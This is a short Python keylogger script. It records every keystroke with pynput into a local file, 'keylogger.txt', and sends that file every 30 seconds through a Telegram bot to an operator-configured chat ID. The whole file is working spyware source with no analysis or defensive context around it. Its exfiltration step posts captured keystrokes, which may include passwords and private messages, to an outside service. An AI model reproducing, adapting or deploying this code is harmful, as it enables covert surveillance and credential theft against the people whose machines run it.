import telebot
import sched
import time
from pynput import keyboard
import config

API_KEY = config.BOT_API_KEY
CHAT_ID = config.USER_ID  # Replace with your chat ID

event_schedule = sched.scheduler(time.time, time.sleep)
bot = telebot.TeleBot(API_KEY)

def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)

def on_key_press(Key):
    try:
        if Key == keyboard.Key.enter:
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif Key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        elif Key == keyboard.Key.space:
            write(" ")
        else:
            temp = repr(Key) + " Pressed.\n"
            write(temp)
            print(f"\n{Key} Pressed\n")

def on_key_release(Key):
    if Key == keyboard.Key.esc:
        return False

def send_logs(sc):
    with open("keylogger.txt", 'rb') as f:
        bot.send_document(CHAT_ID, f)
    event_schedule.enter(30, 1, send_logs, (sc,))

# Schedule the log sending
event_schedule.enter(30, 1, send_logs, (event_schedule,))

# Start the keylogger
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    event_schedule.run()
    listener.join()

bot.infinity_polling()
